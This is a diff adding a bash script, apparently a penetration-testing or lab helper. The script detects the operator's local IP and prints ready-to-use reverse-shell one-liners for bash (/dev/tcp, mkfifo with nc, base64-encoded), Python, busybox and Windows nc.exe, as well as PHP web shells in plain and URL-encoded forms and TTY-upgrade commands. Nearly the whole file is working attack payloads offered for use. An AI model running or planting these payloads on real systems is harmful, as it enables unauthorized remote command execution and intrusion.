@@ -1,0 +1,98 @@
+#!/bin/bash
+
+# Colors
+GREEN='\033[0;32m' # Green
+NC='\033[0m'       # No Color
+
+# Make this work for local lab also
+if ip -4 a show tun0 &> /dev/null; then
+    LHOST=$(ip -4 a show tun0 | grep -Po 'inet \K[\d.]+')
+else
+    LHOST=$(ip -4 a show wlan0 | grep -Po 'inet \K[\d.]+')
+fi
+
+
+if [ $# -eq 0 ]
+then
+  PORT=443
+else
+  PORT=$1
+fi
+
+cat << "EOF"
+                  _____ _          _ _     
+                 / ____| |        | | |    
+  _ __ _____   _| (___ | |__   ___| | |___ 
+ | '__/ _ \ \ / /\___ \| '_ \ / _ \ | / __|
+ | | |  __/\ V / ____) | | | |  __/ | \__ \
+ |_|  \___| \_/ |_____/|_| |_|\___|_|_|___/
+                                           
+                                                                
+EOF
+
+# https://patorjk.com/software/taag/#p=display&f=Big&t=Shells
+
+echo -e "Local IP=${GREEN}$LHOST${NC}"
+echo -e "PORT=${GREEN}$PORT${NC}"
+
+echo ""
+echo '********** Bash **********'
+echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'"
+echo "bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$PORT+0>%261'"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $PORT >/tmp/f"
+echo "rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20$LHOST%20$PORT%20%3E/tmp/f"
+echo "nc $LHOST $PORT -e /bin/sh"
+echo "busybox nc $LHOST $PORT -e sh"
+
+ENCODED=$(echo -ne "bash -c 'bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'" | base64 -w0)
+echo "echo $ENCODED | base64 -d | sh"
+
+echo ""
+echo '********** PHP **********'
+cat << "EOF"
+<?php
+  if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+  }
+?>
+EOF
+echo '<%3fphp+if(isset($_REQUEST['cmd'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST['cmd'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>'
+echo '<?php echo system($_GET['cmd']); ?>'
+echo '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
+
+echo ""
+echo '********** Python **********'
+echo '## Python 2'
+cat << EOF
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
+EOF
+echo '## Python 3'
+cat << EOF
+/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$LHOST",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+EOF
+
+echo ""
+echo '********** PowerShell **********'
+echo "pshell.py $LHOST $PORT"
+
+echo ""
+echo '********** Windows nc **********'
+echo ".\\nc.exe $LHOST $PORT -e cmd.exe"
+
+echo ""
+echo '********** Interactive Shell **********'
+cat << EOF
+which python python2 python3
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+# Ctrl + Z
+stty raw -echo;fg;reset
+stty columns 118 rows 64
+EOF
